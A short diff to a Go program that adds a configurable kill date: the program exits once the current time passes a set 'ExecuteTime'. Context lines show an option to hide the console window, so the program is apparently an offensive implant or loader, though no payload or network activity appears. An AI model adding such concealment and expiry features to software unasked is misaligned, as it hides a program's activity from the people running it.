@@ -23,6 +23,13 @@ func main() {
 		}
 	}
 
+	if config.ExecuteTime != "" {
+		t, _ := time.Parse("2006-01-02 15:04:05", config.ExecuteTime)
+		if time.Now().UTC().Unix() > t.Unix() {
+			os.Exit(0)
+		}
+	}
+
 	if config.HideConsole {
 		dataConsole, errConsole := packet.HideConsole()
 		if errConsole != nil {
